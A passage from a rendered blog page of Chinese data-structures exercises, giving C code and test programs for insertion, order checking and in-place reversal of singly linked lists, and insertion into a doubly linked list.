class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;<span class="comment">//由于是 前插：所以输出的内容是与之前输入的顺序相反</span></span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行插入之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt = insert(pt,<span class="number">11</span>,<span class="number">88</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行插入之后：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/aZmS3FnQAdGk2y5.png" alt="image-20211003122007950"></p><h3 id="3-设计一个算法，判断一个单链表中各个结点值是否有序。"><a href="#3-设计一个算法，判断一个单链表中各个结点值是否有序。" class="headerlink" title="3. 设计一个算法，判断一个单链表中各个结点值是否有序。"></a>3. 设计一个算法，判断一个单链表中各个结点值是否有序。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype  info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="comment">node *creat_first(void)&#123;</span></span><br><span class="line"><span class="comment">    node *head = NULL;</span></span><br><span class="line"><span class="comment">    node *s;</span></span><br><span class="line"><span class="comment">    int x;</span></span><br><span class="line"><span class="comment">    printf(&quot;请输入各个结点的值：\n&quot;);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    while(x != FLAG)&#123;</span></span><br><span class="line"><span class="comment">        s = (node*)malloc(sizeof(node));</span></span><br><span class="line"><span class="comment">        s-&gt;info = x;</span></span><br><span class="line"><span class="comment">        s-&gt;next = head;</span></span><br><span class="line"><span class="comment">        head = s;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return head;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的!\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *pt;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//pt = creat_first();</span></span><br><span class="line"><span class="keyword">while</span>(i &lt;=<span class="number">3</span>)&#123;</span><br><span class="line">pt = creat_behind();</span><br><span class="line">print(pt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;a&#x27;</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 升序 排列的！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;b&#x27;</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 降序 排列的！\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 无序 排列的！\n\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/fr4LIcPyRCUT9a6.png" alt="image-20211003213242240"></p><h3 id="4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"><a href="#4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。" class="headerlink" title="4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"></a>4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原单链表：\n&quot;</span>);</span><br><span class="line">    print(pt); </span><br><span class="line">    reverse(pt); <span class="comment">//转置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转置之后的单链表：\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/7FEl8ghiqaZ2rS5.png" alt="image-20211005190811303"></p><h3 id="5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span 